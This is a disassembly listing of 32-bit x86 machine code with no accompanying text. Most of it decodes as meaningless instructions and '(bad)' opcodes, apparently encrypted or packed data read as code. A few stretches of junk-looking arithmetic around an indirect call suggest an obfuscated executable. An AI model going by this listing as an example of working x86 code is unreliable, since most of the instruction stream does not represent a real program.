  40abde:	lods   al,BYTE PTR ds:[esi]
  40abdf:	imul   edi,DWORD PTR [edx],0x15
  40abe2:	push   esp
  40abe3:	call   0x8218:0x2e47deb4
  40abea:	cmp    ecx,DWORD PTR [ecx-0x4f76aa50]
  40abf0:	hlt    
  40abf1:	aad    0x3a
  40abf3:	sti    
  40abf4:	xchg   ecx,eax
  40abf5:	je     0x40ab9b
  40abf7:	mov    eax,0x70347d43
  40abfc:	ds ret 
  40abfe:	jecxz  0x40ab8a
  40ac00:	stos   BYTE PTR es:[edi],al
  40ac01:	ror    edi,0x2d
  40ac04:	fisub  WORD PTR [edi-0x32d91f8a]
  40ac0a:	or     eax,DWORD PTR [ebx+esi*4]
  40ac0d:	sti    
  40ac0e:	xor    esi,DWORD PTR [ebp-0x6066c4dc]
  40ac14:	iret   
  40ac15:	inc    ebx
  40ac16:	sbb    BYTE PTR [edx+0x2a],ah
  40ac19:	or     BYTE PTR [edi],bl
  40ac1b:	ja     0x40ac5e
  40ac1d:	aaa    
  40ac1e:	lea    eax,[ebp-0x5752223d]
  40ac24:	cdq    
  40ac25:	shl    cl,0x1d
  40ac28:	ins    BYTE PTR es:[edi],dx
  40ac29:	shl    DWORD PTR [ebx+0x783dc996],cl
  40ac2f:	mov    eax,ds:0x38d4bcc2
  40ac34:	clc    
  40ac35:	dec    esi
  40ac36:	pop    ebx
  40ac37:	add    eax,0xca1de569
  40ac3c:	jmp    0x40ac2c
  40ac3e:	jbe    0x40abe8
  40ac40:	sub    bl,BYTE PTR [ebx-0x53]
  40ac43:	les    ecx,FWORD PTR [edx+edi*2]
  40ac46:	stos   DWORD PTR es:[edi],eax
  40ac47:	lods   al,BYTE PTR ds:[esi]
  40ac48:	shr    DWORD PTR [esi-0x39ad9806],1
  40ac4e:	xor    edi,0xffffffb9
  40ac51:	ror    BYTE PTR [esi+ebp*1+0x631e6a58],cl
  40ac58:	adc    eax,0x47ac55ee
  40ac5d:	mov    ebp,0x2413a13f
  40ac62:	adc    eax,0x4e0a32e2
  40ac67:	cmp    DWORD PTR [esi],edi
  40ac69:	cmp    BYTE PTR [edi],bl
  40ac6b:	jae    0x40ac50
  40ac6d:	fwait
  40ac6e:	leave  
  40ac6f:	mov    eax,esp
  40ac71:	or     BYTE PTR [esi+0x3c],cl
  40ac74:	jge    0x40ac9c
  40ac76:	stos   DWORD PTR es:[edi],eax
  40ac77:	dec    esi
  40ac78:	adc    al,0xec
  40ac7a:	and    ah,BYTE PTR [ebp+0x2f]
  40ac7d:	fwait
  40ac7e:	ret    
  40ac7f:	xchg   edx,eax
  40ac80:	dec    ebp
  40ac81:	int    0xe6
  40ac83:	push   edi
  40ac84:	push   cs
  40ac85:	push   eax
  40ac86:	loopne 0x40acf2
  40ac88:	test   al,0x36
  40ac8a:	lock sub al,0xce
  40ac8d:	stc    
  40ac8e:	pop    edx
  40ac8f:	jo     0x40ac70
  40ac91:	pop    ebx
  40ac92:	test   BYTE PTR [edx+0x63d6af4c],ah
  40ac98:	call   FWORD PTR [eax]
  40ac9a:	pusha  
  40ac9b:	inc    edx
  40ac9c:	mov    ecx,cs
  40ac9e:	mov    bh,0x4c
  40aca0:	ficom  WORD PTR [edx]
  40aca2:	fisubr WORD PTR [edx+0x36]
  40aca5:	test   al,0xe7
  40aca7:	sbb    DWORD PTR [eax+0x2ffa8d74],0xf83501de
  40acb1:	add    DWORD PTR [esi],eax
  40acb3:	lea    edx,[edi]
  40acb5:	cli    
  40acb6:	retf   0xf592
  40acb9:	xchg   DWORD PTR fs:[esi-0xf],esi
  40acbd:	imul   ecx,DWORD PTR [bx-0x2b6b],0x2cb96042
  40acc6:	add    BYTE PTR [edx+0x69],0xec
  40acca:	jno    0x40ad45
  40accc:	test   DWORD PTR [ebx-0x1f],esp
  40accf:	xchg   esi,eax
  40acd0:	js     0x40acfd
  40acd2:	push   esp
  40acd3:	inc    ebx
  40acd4:	cmp    ebx,DWORD PTR ss:[eax-0xd]
  40acd8:	sahf   
  40acd9:	mov    DWORD PTR [ecx+0x1d],ebp
  40acdc:	out    0xe9,al
  40acde:	inc    ebx
  40acdf:	xchg   edi,eax
  40ace0:	repz adc eax,0xf8caf185
  40ace6:	mov    esi,0xb6d16a0c
  40aceb:	inc    ebp
  40acec:	add    dl,BYTE PTR [esi+0x6f]
  40acef:	(bad)  
  40acf0:	bound  edi,QWORD PTR ds:[ebx-0x5e0fca92]
  40acf7:	daa    
  40acf8:	sbb    esp,DWORD PTR [edi-0xd5255dc]
  40acfe:	xor    ebp,esi
  40ad00:	add    DWORD PTR [ebx+0x303a59d2],esp
  40ad06:	(bad)  
  40ad07:	inc    ecx
  40ad08:	ja     0x40aca5
  40ad0a:	or     al,0xa2
  40ad0c:	push   ebp
  40ad0d:	adc    BYTE PTR es:[edi],bl
  40ad10:	xor    eax,0xbcc262f5
  40ad15:	out    0x99,al
  40ad17:	cli    
  40ad18:	push   edx
  40ad19:	mov    al,dl
  40ad1b:	arpl   WORD PTR [ecx+0x0],di
  40ad1e:	add    cl,0x1a
  40ad21:	mov    dh,0x65
  40ad23:	lods   eax,DWORD PTR ds:[esi]
  40ad24:	scas   al,BYTE PTR es:[edi]
  40ad25:	adc    DWORD PTR [eax],edx
  40ad27:	stos   BYTE PTR es:[edi],al
  40ad28:	idiv   eax
  40ad2a:	cli    
  40ad2b:	pop    es
  40ad2c:	into   
  40ad2d:	jmp    0x40ad7d
  40ad2f:	add    cl,dl
  40ad31:	arpl   WORD PTR [eax+0x2bd0e6c7],ax
  40ad37:	cmp    dl,BYTE PTR [ecx+edx*8-0x38]
  40ad3b:	cdq    
  40ad3c:	(bad)  
  40ad3d:	jo     0x40adb8
  40ad3f:	mov    dl,0xc4
  40ad41:	rol    BYTE PTR [edi-0x7b],cl
  40ad44:	in     al,dx
  40ad45:	fbstp  TBYTE PTR ds:0x9c3bd3ae
  40ad4b:	mov    ebx,0x9f461727
  40ad50:	xchg   ebp,eax
  40ad51:	(bad)  
  40ad52:	icebp  
  40ad53:	sub    BYTE PTR [eax+ecx*1],0x4
  40ad57:	mov    eax,0x8db3faa6
  40ad5c:	or     al,0x8f
  40ad5e:	mov    esi,0xc644c026
  40ad63:	xor    eax,0xee4c46e3
  40ad68:	inc    BYTE PTR [esi]
  40ad6a:	shr    ecx,cl
  40ad6c:	sbb    al,0x97
  40ad6e:	scas   al,BYTE PTR es:[edi]
  40ad6f:	jns    0x40ad00
  40ad71:	inc    eax
  40ad72:	(bad)  [ebp+0xd955db5]
  40ad78:	cli    
  40ad79:	loop   0x40ad25
  40ad7b:	retf   
  40ad7c:	sbb    eax,0xf8483ce6
  40ad81:	jae    0x40ad5d
  40ad83:	xor    bl,BYTE PTR [edx-0x5abae79]
  40ad89:	xor    dh,ah
  40ad8b:	ja     0x40ada3
  40ad8d:	xchg   ebx,eax
  40ad8e:	fistp  WORD PTR [ecx]
  40ad90:	outs   dx,BYTE PTR ds:[esi]
  40ad91:	pop    es
  40ad92:	push   edx
  40ad93:	shl    BYTE PTR [ebx-0x64],1
  40ad96:	pop    esp
  40ad97:	aaa    
  40ad98:	rcr    DWORD PTR [ecx+0x22f8104f],0x85
  40ad9f:	icebp  
  40ada0:	cdq    
  40ada1:	outs   dx,BYTE PTR ds:[esi]
  40ada2:	sbb    eax,0x32a26ed3
  40ada7:	lods   eax,DWORD PTR ds:[esi]
  40ada8:	mov    dl,0x2d
  40adaa:	rcr    ebx,1
  40adac:	adc    al,0xe3
  40adae:	add    ecx,DWORD PTR ds:0xc2d487f5
  40adb4:	iret   
  40adb5:	cld    
  40adb6:	pop    ds
  40adb7:	shr    dh,0x2f
  40adba:	and    eax,0xde6c78af
  40adbf:	xor    al,0xf5
  40adc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adc2:	xchg   BYTE PTR [edx],ah
  40adc4:	push   edi
  40adc5:	ror    ah,1
  40adc7:	push   ebp
  40adc8:	or     DWORD PTR [ebx+ebx*8+0x23f575bf],0x1223f89f
  40add3:	pop    esi
  40add4:	pop    esp
  40add5:	outs   dx,DWORD PTR ds:[esi]
  40add6:	inc    esi
  40add7:	jb     0x40ae4f
  40add9:	xchg   BYTE PTR [ebx-0x50],dh
  40addc:	mov    ecx,DWORD PTR [ecx]
  40adde:	bound  esi,QWORD PTR [ecx]
  40ade0:	cmp    BYTE PTR [edx+ecx*8+0x4d],al
  40ade4:	aad    0x63
  40ade6:	nop
  40ade7:	imul   edi,DWORD PTR [eax+edi*2+0x1b382167],0x33
  40adef:	push   0xd56e647f
  40adf4:	aad    0x27
  40adf6:	nop
  40adf7:	inc    esi
  40adf8:	adc    DWORD PTR [ecx+0x38],ebp
  40adfb:	lods   eax,DWORD PTR ds:[esi]
  40adfc:	cmp    DWORD PTR [edx-0x151723a3],edx
  40ae02:	test   BYTE PTR [edi],ah
  40ae04:	sar    DWORD PTR [ebp+ecx*2-0x545b2778],1
  40ae0b:	into   
  40ae0c:	push   0x88bbfa05
  40ae11:	xor    dl,al
  40ae13:	bound  esi,QWORD PTR [eax]
  40ae15:	scas   al,BYTE PTR es:[edi]
  40ae16:	or     BYTE PTR [esi],dl
  40ae18:	push   es
  40ae19:	mov    ecx,0x8fa860cd
  40ae1e:	rcr    BYTE PTR [ebp-0x4d],cl
  40ae21:	jae    0x40ae4f
  40ae23:	or     BYTE PTR [esi+0x55016795],al
  40ae29:	or     al,0x1a
  40ae2b:	fs aad 0xf5
  40ae2e:	fdivr  QWORD PTR [esp+esi*1+0x67]
  40ae32:	cmp    BYTE PTR [ecx-0x24],dl
  40ae35:	mov    ds:0xf754d26,eax
  40ae3a:	jmp    0x40ae8c
  40ae3c:	inc    ebx
  40ae3d:	pop    es
  40ae3e:	adc    DWORD PTR [edx],esp
  40ae40:	fdiv   DWORD PTR [ecx-0x57d02ad4]
  40ae46:	sbb    ebx,ebx
  40ae48:	aam    0xc7
  40ae4a:	inc    ebp
  40ae4b:	loopne 0x40ae10
  40ae4d:	outs   dx,BYTE PTR ds:[esi]
  40ae4e:	add    BYTE PTR [eax],al
  40ae50:	xor    ecx,0x7405
  40ae56:	push   esi
  40ae57:	mov    DWORD PTR [ebp-0x1c],0x2a74
  40ae5e:	mov    DWORD PTR [ebp-0x10],0x2e2c
  40ae65:	push   0x5285
  40ae6a:	xor    ecx,0x324d
  40ae70:	mov    DWORD PTR [ebp-0xc],0x3d0a
  40ae77:	sbb    eax,ecx
  40ae79:	mov    eax,DWORD PTR [ebp-0x10]
  40ae7c:	cmp    DWORD PTR ds:0x42828b,0x0
  40ae83:	mov    ecx,DWORD PTR ds:0x428253
  40ae89:	mov    ecx,0x7ccc
  40ae8e:	jmp    0x40af01
  40ae93:	mov    DWORD PTR ds:0x428387,edx
  40ae99:	movzx  ecx,BYTE PTR ds:0x42826b
  40aea0:	cmp    DWORD PTR ds:0x42828b,0x0
  40aea7:	ja     0x40aee7
  40aead:	push   0x309a
  40aeb2:	push   DWORD PTR [ebp-0x1c]
  40aeb5:	push   DWORD PTR [ebp-0x14]
  40aeb8:	push   0x4280bb
  40aebd:	call   DWORD PTR ds:0x428e78
  40aec3:	mov    ecx,DWORD PTR ds:0x42830b
  40aec9:	xor    DWORD PTR ds:0x42822f,ecx
  40aecf:	or     DWORD PTR ds:0x42837b,ecx
  40aed5:	or     DWORD PTR ds:0x428293,ecx
  40aedb:	mov    ecx,DWORD PTR ds:0x42829f
  40aee1:	adc    DWORD PTR ds:0x428267,ecx
  40aee7:	xor    ecx,ecx
  40aee9:	or     ecx,DWORD PTR ds:0x428163
  40aeef:	adc    ecx,DWORD PTR ds:0x428387
  40aef5:	mov    DWORD PTR ds:0x428163,ecx
  40aefb:	and    ecx,0x2e4b
  40af01:	mov    ecx,DWORD PTR [ebp-0xc]
  40af04:	push   0x712c
  40af09:	adc    DWORD PTR ds:0x428383,0x4282f7
  40af13:	push   ecx
  40af14:	and    DWORD PTR ds:0x428163,0x72a4
  40af1e:	jmp    0x40b314
  40af23:	xchg   ecx,eax
  40af24:	sahf   
  40af25:	push   0x5e4f260e
  40af2a:	push   ds
  40af2b:	(bad)  
  40af2c:	fist   WORD PTR [edi-0x56]
  40af2f:	or     BYTE PTR [ebp+0x1bb56af2],0x18
  40af36:	sbb    BYTE PTR [esi+0x12],ch
  40af39:	sbb    BYTE PTR [eax],bl
  40af3b:	fimul  WORD PTR [edi]
  40af3d:	sub    DWORD PTR [eax],0xffffff9f
  40af40:	xlat   BYTE PTR ds:[ebx]
  40af41:	push   esp
  40af42:	mov    eax,DWORD PTR [ecx-0x7a1d3437]
  40af48:	test   al,0x95
  40af4a:	sub    eax,DWORD PTR [eax+0x3d]
  40af4d:	mov    WORD PTR [edx-0x7c],?
  40af50:	mov    eax,0x969695e4
  40af55:	or     ecx,DWORD PTR [eax+0x239d8da7]
  40af5b:	push   0xffffff85
  40af5d:	pop    ss
  40af5e:	lods   al,BYTE PTR ds:[esi]
  40af5f:	ins    DWORD PTR es:[edi],dx
  40af60:	push   es
  40af61:	outs   dx,DWORD PTR ds:[esi]
  40af62:	inc    edi
  40af63:	or     eax,DWORD PTR [ebx]
  40af65:	adc    DWORD PTR [eax+0x1b52b752],eax
  40af6b:	sahf   
  40af6c:	(bad)  
  40af6d:	jg     0x40afb6
  40af6f:	pop    es
  40af70:	pop    es
  40af71:	xchg   esi,eax
  40af72:	sub    eax,0x1157cd31
  40af77:	cmp    ch,BYTE PTR [ebp-0xfbe31aa]
  40af7d:	and    bh,bh
  40af7f:	int    0x57
  40af81:	inc    ebx
  40af82:	sbb    al,0x2b
  40af84:	xor    eax,0xc37f1363
  40af89:	shl    DWORD PTR [ebx],1
  40af8b:	(bad)  
  40af8c:	out    0x27,eax
  40af8e:	push   ds
  40af8f:	jae    0x40afaa
  40af91:	(bad)  
  40af92:	or     al,0xe3
  40af94:	xchg   edx,eax
  40af95:	dec    esp
  40af96:	push   si
  40af98:	mov    ebx,DWORD PTR [eax-0x34]
  40af9b:	mov    ah,ch
  40af9d:	leave  
  40af9e:	out    0x52,al
  40afa0:	fisttp DWORD PTR [eax+0x532a994d]
  40afa6:	sub    al,0xc7
  40afa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afa9:	clc    
  40afaa:	mov    bh,0x80
  40afac:	ds loope 0x40afdb
  40afaf:	icebp  
  40afb0:	sub    al,0x14
  40afb2:	and    al,0x7d
  40afb4:	cmp    al,0x4c
  40afb6:	dec    ebx
  40afb7:	scas   al,BYTE PTR es:[edi]
  40afb8:	in     al,dx
  40afb9:	and    BYTE PTR ds:0xa5d0c078,bh
  40afbf:	ret    0xef1e
  40afc2:	xchg   dh,bl
  40afc4:	(bad)  
  40afc5:	xchg   ebx,eax
  40afc6:	ror    bh,cl
  40afc8:	clc    
  40afc9:	pop    esp
  40afca:	loopne 0x40af7d
  40afcc:	hlt    
  40afcd:	jno    0x40b00a
  40afcf:	lea    edi,[edx-0x7b]
  40afd2:	shl    DWORD PTR [edx],cl
  40afd4:	pop    ebx
  40afd5:	push   edx
  40afd6:	add    edi,edx
  40afd8:	pop    edi
  40afd9:	std    
  40afda:	jmp    0xdf775204
  40afdf:	cmp    eax,0xa9796698
  40afe4:	sahf   
  40afe5:	repnz or bh,BYTE PTR [ebp-0x45]
  40afe9:	retf   0x4d5d
  40afec:	pop    edi
  40afed:	mov    dl,0x25
  40afef:	mov    ebp,0x32c0bbe7
  40aff4:	dec    eax
  40aff5:	test   eax,0x3dfe387d
  40affa:	pop    ebx
  40affb:	sub    BYTE PTR [ecx+0x6b],al
  40affe:	cmp    DWORD PTR [eax-0x38b24d62],edx
  40b004:	or     BYTE PTR [edi],bl
  40b006:	mov    ah,0xce
  40b008:	push   ecx
  40b009:	xchg   ecx,eax
  40b00a:	sub    dh,BYTE PTR [edx+0x484dd391]
  40b010:	popf   
  40b011:	fidivr DWORD PTR [eax-0x729454f1]
  40b017:	mov    esi,0x8adcd12f
  40b01c:	mov    bh,0x6e
  40b01e:	sar    DWORD PTR [ebx-0x6eea8dc1],0x71
  40b025:	mov    al,0x5e
  40b027:	pop    edx
  40b028:	icebp  
  40b029:	call   FWORD PTR [ecx-0x58]
  40b02c:	ret    
  40b02d:	ins    DWORD PTR es:[edi],dx
  40b02e:	loope  0x40b032
  40b030:	cwde   
  40b031:	xlat   BYTE PTR ds:[ebx]
  40b032:	sub    esi,DWORD PTR [edx]
  40b034:	mov    al,0x8f
  40b036:	popf   
  40b037:	cmp    BYTE PTR [esi+0x1ebd4d32],bh
  40b03d:	mov    bl,0xdf
  40b03f:	addr16 mov al,0xc5
  40b042:	mov    al,ds:0xbe5eabd7
  40b047:	xor    cl,ah
  40b049:	stc    
  40b04a:	(bad)  
  40b04b:	es push esp
  40b04e:	(bad)  
  40b04f:	imul   ebx,DWORD PTR [eax+0xb],0xffffffd7
  40b053:	push   es
  40b054:	sbb    al,0x3b
  40b056:	xor    ebp,DWORD PTR [ecx+esi*8]
  40b059:	pusha  
  40b05a:	call   0xc55e:0x8a16c5a8
  40b061:	inc    edx
  40b062:	mov    dl,0x20
  40b064:	adc    ecx,DWORD PTR [ecx+eiz*1]
  40b067:	js     0x40b02b
  40b069:	adc    dl,BYTE PTR [ecx-0x77]
  40b06c:	inc    esp
  40b06d:	fstp   DWORD PTR [edi+eax*1-0x2a]
  40b071:	lods   al,BYTE PTR ds:[esi]
  40b072:	lods   eax,DWORD PTR ds:[esi]
  40b073:	jo     0x40b086
  40b075:	mov    cl,0xc
  40b077:	ds jg  0x40b071
  40b07a:	and    edx,ebp
  40b07c:	popa   
  40b07d:	push   0x5d
  40b07f:	test   DWORD PTR [ebx+edi*2],esi
  40b082:	jae    0x40b026
  40b084:	test   BYTE PTR [edx-0x287f4c28],bl
  40b08a:	inc    esi
  40b08b:	lock imul ebx
  40b08e:	es je  0x40b0cf
  40b091:	lds    esp,FWORD PTR [eax+0x60d0626f]
  40b097:	or     BYTE PTR [esi],ah
  40b099:	dec    eax
  40b09a:	or     BYTE PTR [edx-0x294fcfeb],bl
  40b0a0:	mov    al,0x81
  40b0a2:	(bad)  
  40b0a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0a4:	or     al,0x8c
  40b0a7:	int3   
  40b0a8:	aad    0x2
  40b0aa:	xlat   BYTE PTR ds:[ebx]
  40b0ab:	stos   DWORD PTR es:[edi],eax
  40b0ac:	inc    eax
  40b0ad:	mov    esi,0xaa3524b5
  40b0b2:	(bad)  
  40b0b3:	aam    0xbd
  40b0b5:	scas   eax,DWORD PTR es:[edi]
  40b0b6:	std    
  40b0b7:	sub    BYTE PTR [ebp+0x7e],dl
  40b0ba:	leave  
  40b0bb:	outs   dx,DWORD PTR ds:[esi]
  40b0bc:	adc    al,0x2e
  40b0be:	jae    0x40b050
  40b0c0:	scas   eax,DWORD PTR es:[edi]
  40b0c1:	outs   dx,BYTE PTR ds:[esi]
  40b0c2:	mov    ah,0x56
  40b0c4:	sub    ebp,DWORD PTR [ecx-0x6864b9bc]
  40b0ca:	ss das 
  40b0cc:	jo     0x40b076
  40b0ce:	add    edi,DWORD PTR [esi+0x2d]
  40b0d1:	xchg   esi,eax
  40b0d2:	rcr    BYTE PTR [edi],1
  40b0d4:	fstp   DWORD PTR [edx+eiz*8-0x51]
  40b0d8:	cmp    DWORD PTR [ebx+0x74],0xf4d090c5
  40b0df:	dec    eax
  40b0e0:	sub    al,0xdb
  40b0e2:	push   ds
  40b0e3:	aas    
  40b0e4:	xor    edi,DWORD PTR [edi-0x34b376e3]
  40b0ea:	add    eax,0x1bf79a82
  40b0ef:	jb     0x40b0c3
  40b0f1:	xor    bl,BYTE PTR [esi-0x2db39d41]
  40b0f7:	int    0x8a
  40b0f9:	outs   dx,BYTE PTR ds:[esi]
  40b0fa:	and    BYTE PTR [esp+edx*1],bh
  40b0fd:	retf   0x798f
  40b100:	sbb    eax,0x8176e3cd
  40b105:	outs   dx,BYTE PTR ds:[esi]
  40b106:	fnstenv [esp+ebx*8+0x3bb47c05]
  40b10d:	add    DWORD PTR [esp],eax
  40b110:	push   es
  40b111:	sub    al,0x0
  40b113:	pop    ss
  40b114:	(bad)  
  40b116:	test   al,0xfd
  40b118:	push   esi
  40b119:	adc    DWORD PTR [edi],eax
  40b11b:	sub    ecx,DWORD PTR [ecx-0x3b]
  40b11e:	stos   DWORD PTR es:[edi],eax
  40b11f:	fwait
  40b120:	jle    0x40b18f
  40b122:	add    ecx,edx
  40b124:	push   eax
  40b125:	pushf  
  40b126:	ja     0x40b14c
  40b128:	mov    eax,0xdd83bf57
  40b12d:	xor    al,0x4e
  40b12f:	test   BYTE PTR [esi],ah
  40b131:	(bad)  
  40b132:	pusha  
  40b133:	int    0xf9
  40b135:	int3   
  40b136:	xchg   DWORD PTR [ecx+0x48],ebp
  40b139:	push   ecx
  40b13a:	dec    eax
  40b13b:	idiv   DWORD PTR [edx+0x67]
  40b13e:	(bad)  
  40b13f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b140:	ins    DWORD PTR es:[edi],dx
  40b141:	rcr    BYTE PTR [esi],cl
  40b143:	fstp   QWORD PTR ds:0xf12b5824
  40b149:	fimul  DWORD PTR [ebp+0x8]
  40b14c:	inc    ebx
  40b14d:	add    ebp,DWORD PTR [eax+0x7d42229f]
  40b153:	xor    DWORD PTR [ebp+0x76a4d54b],0x31
  40b15a:	jae    0x40b1c2
  40b15c:	js     0x40b106
  40b15e:	mov    eax,0xd3fc7ec
  40b163:	adc    BYTE PTR [ecx-0x6f],cl
  40b166:	test   bl,bl
  40b168:	xchg   esi,eax
  40b169:	hlt    
  40b16a:	mov    ds,WORD PTR [ebx-0x29]
  40b16d:	ins    DWORD PTR es:[edi],dx
  40b16e:	gs sub eax,0x48b59d25
  40b174:	jns    0x40b149
  40b176:	cmc    
  40b177:	in     al,dx
  40b178:	in     al,dx
  40b179:	mov    bh,0x18
  40b17b:	and    eax,DWORD PTR [ecx]
  40b17d:	jb     0x40b15e
  40b17f:	loopne 0x40b1af
  40b181:	add    BYTE PTR [edx+0x2c650a9c],dl
  40b187:	xchg   ecx,eax
  40b188:	int3   
  40b189:	push   ss
  40b18a:	pop    esi
  40b18b:	dec    eax
  40b18c:	(bad)  
  40b18d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b18e:	mov    al,BYTE PTR [ecx+0x171ff4ea]
  40b194:	sub    al,0x64
  40b196:	out    dx,eax
  40b197:	inc    esi
  40b198:	push   edi
  40b199:	jbe    0x40b16f
  40b19b:	fistp  QWORD PTR [esi]
  40b19d:	xchg   esp,eax
  40b19e:	mov    ecx,0xbcf2628c
  40b1a3:	adc    eax,0x1387e36f
  40b1a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1a9:	mov    dl,0x39
  40b1ab:	push   ebp
  40b1ac:	mov    esi,0x94b27725
  40b1b1:	jp     0x40b16f
  40b1b3:	sub    al,0x22
  40b1b5:	outs   dx,DWORD PTR ds:[esi]
  40b1b6:	ins    DWORD PTR es:[edi],dx
  40b1b7:	popf   
  40b1b8:	pop    ds
  40b1b9:	call   0x992b:0x9e60119d
  40b1c0:	les    esp,FWORD PTR [ecx-0x13]
  40b1c3:	fwait
  40b1c4:	xchg   ebp,eax
  40b1c5:	xchg   edx,eax
  40b1c6:	fwait
  40b1c7:	add    ebx,ecx
  40b1c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1ca:	clc    
  40b1cb:	cmp    ebx,DWORD PTR [ecx+0xc]
  40b1ce:	add    ebp,DWORD PTR [ebx+0x330ac8ce]
  40b1d4:	clc    
  40b1d5:	mov    dh,0xef
  40b1d7:	or     eax,0x1945bb2c
  40b1dc:	xchg   DWORD PTR [edx],edx
  40b1de:	out    dx,eax
  40b1df:	push   esp
  40b1e0:	xchg   esi,eax
  40b1e1:	lea    esp,[ebx+ecx*4+0x23e47ae4]
  40b1e8:	pop    edx
  40b1e9:	add    bh,0x6e
  40b1ec:	ror    DWORD PTR [ebx+0x3a299265],1
  40b1f2:	shl    dl,0xc2
  40b1f5:	pusha  
  40b1f6:	inc    ecx
  40b1f7:	clc    
  40b1f8:	or     BYTE PTR [eax],dl
  40b1fa:	mov    edx,0xb3834b7a
  40b1ff:	or     eax,0xdf7814fc
  40b204:	sub    esp,DWORD PTR [ebp-0x60]
  40b207:	bound  esp,QWORD PTR [eax]
  40b209:	mov    DWORD PTR [esi-0x1],edx
  40b20c:	mov    cl,0xcd
  40b20e:	dec    ebp
  40b20f:	lahf   
  40b210:	lds    edi,FWORD PTR [ebp+0x6bd9131e]
  40b216:	std    
  40b217:	(bad)  
  40b219:	dec    esp
  40b21a:	jne    0x40b1a7
  40b21c:	mov    dl,0x3b
  40b21e:	xchg   BYTE PTR [edi-0x76147873],bl
  40b224:	int    0x6a
  40b226:	sub    DWORD PTR [ebp+0x76],0x12b00b4d
  40b22d:	mov    eax,ds:0x2566fbbd
  40b232:	scas   eax,DWORD PTR es:[edi]
  40b233:	arpl   WORD PTR [edi+0x73],cx
  40b236:	sub    eax,0x95bee0da
  40b23b:	dec    esi
  40b23c:	cld    
  40b23d:	push   0xa4062ca
  40b242:	xor    eax,0x73ae4a58
  40b247:	sti    
  40b248:	adc    ah,BYTE PTR [ecx+ebx*8]
  40b24b:	cdq    
  40b24c:	arpl   WORD PTR [esi],si
  40b24e:	cmp    al,0x60
  40b250:	imul   DWORD PTR [ebp+0x32e769c5]
  40b256:	xor    BYTE PTR [esp+eiz*4+0xe],al
  40b25a:	mov    BYTE PTR [ebp-0x3888ad05],bl
  40b260:	pop    ecx
  40b261:	popf   
  40b262:	in     eax,0x23
  40b264:	xchg   ebp,eax
  40b265:	jno    0x40b1f6
  40b267:	dec    DWORD PTR [ebx+edx*4+0x71035977]
  40b26e:	out    0x35,al
  40b270:	ins    BYTE PTR es:[edi],dx
  40b271:	or     bh,BYTE PTR [eax+0x544e488]
  40b277:	rol    BYTE PTR [edi+ebp*1+0x4d606f43],cl
  40b27e:	add    al,0x51
  40b280:	(bad)  
  40b281:	mov    fs,WORD PTR [edx-0x2e]
  40b284:	loop   0x40b301
  40b286:	sbb    edi,DWORD PTR [ebx+0x38]
  40b289:	mov    dh,BYTE PTR [ecx]
  40b28b:	push   ebx
  40b28c:	jmp    0xe35f:0x446f3282
  40b293:	mov    ebp,0x7a674eb7
  40b298:	and    dh,BYTE PTR [edx]
  40b29a:	or     BYTE PTR [ebx+0x59],bh
  40b29d:	out    dx,eax
  40b29e:	jbe    0x40b296
  40b2a0:	cs pop ss
  40b2a2:	fadd   DWORD PTR [esi]
  40b2a4:	jl     0x40b23f
  40b2a6:	jne    0x40b2bf
  40b2a8:	sub    BYTE PTR [edi+0x43],ah
  40b2ab:	pop    edx
  40b2ac:	std    
  40b2ad:	jmp    0x95ae64db
  40b2b2:	jns    0x40b297
  40b2b4:	push   ebx
  40b2b5:	int    0xac
  40b2b7:	and    al,0x83
  40b2b9:	ret    0xcc5d
  40b2bc:	loopne 0x40b28b
  40b2be:	dec    eax
  40b2bf:	dec    ecx
  40b2c0:	sar    BYTE PTR [eax-0x3a],1
  40b2c3:	clc    
  40b2c4:	or     eax,0x6aae6fc7
  40b2c9:	fsubr  DWORD PTR [ebx]
  40b2cb:	(bad)  
  40b2cc:	or     eax,edi
  40b2ce:	je     0x40b33a
  40b2d0:	jmp    0x7e0cde3a
  40b2d5:	jmp    0x55b76322
  40b2da:	into   
  40b2db:	cmp    BYTE PTR [esi],0xad
  40b2de:	leave  
  40b2df:	outs   dx,BYTE PTR ds:[esi]
  40b2e0:	lods   al,BYTE PTR ds:[esi]
  40b2e1:	xor    al,0xe2
  40b2e3:	cmp    BYTE PTR [ecx],ah
  40b2e5:	add    al,0x93
  40b2e7:	xchg   edx,eax
  40b2e8:	jae    0x40b2bd
  40b2ea:	lock push eax
  40b2ec:	ror    DWORD PTR [ecx+0x4f],0x96
  40b2f0:	xchg   ebp,eax
  40b2f1:	or     eax,0xdb81a09c
  40b2f6:	and    al,0x65
  40b2f8:	in     al,0x2f
  40b2fa:	xchg   esi,eax
  40b2fb:	pop    esp
  40b2fc:	xchg   edx,eax
  40b2fd:	scas   eax,DWORD PTR es:[edi]
  40b2fe:	mov    bh,0xa
  40b300:	popf   
  40b301:	stos   BYTE PTR es:[edi],al
  40b302:	dec    esi
  40b303:	scas   al,BYTE PTR es:[edi]
  40b304:	arpl   WORD PTR [edx],dx
  40b306:	ror    ecx,cl
  40b308:	xchg   ebp,eax
  40b309:	push   esi
  40b30a:	sbb    al,0x50
  40b30c:	ss push ss
  40b30e:	das    
  40b30f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b310:	xor    ecx,ebx
  40b312:	call   0x82eb:0x158150f1
  40b319:	inc    edx
  40b31a:	add    BYTE PTR [ebx-0x17ffbd7e],ah
  40b320:	cld    
  40b321:	mov    eax,0x351b0000
  40b326:	xchg   edi,eax
  40b327:	add    BYTE PTR [edx+0x0],0x8b
  40b32b:	dec    ebp
  40b32c:	loopne 0x40b2af
  40b32e:	(bad)  
  40b32f:	xchg   BYTE PTR [ecx],ch
  40b331:	add    BYTE PTR [eax],al
  40b333:	mov    esi,DWORD PTR [ebp-0x1c]
  40b336:	sbb    DWORD PTR ds:0x42822b,0x4282eb
  40b340:	push   0x5f43
  40b345:	or     edx,0x69b4
  40b34b:	sub    DWORD PTR ds:0x428383,0x4282eb
  40b355:	push   0x1657
  40b35a:	xor    DWORD PTR ds:0x42836b,0x42825f
  40b364:	or     eax,0x528b
  40b369:	xor    edx,esi
  40b36b:	xor    eax,ecx
  40b36d:	sub    DWORD PTR ds:0x42839f,0x42823f
  40b377:	push   edx
  40b378:	push   eax
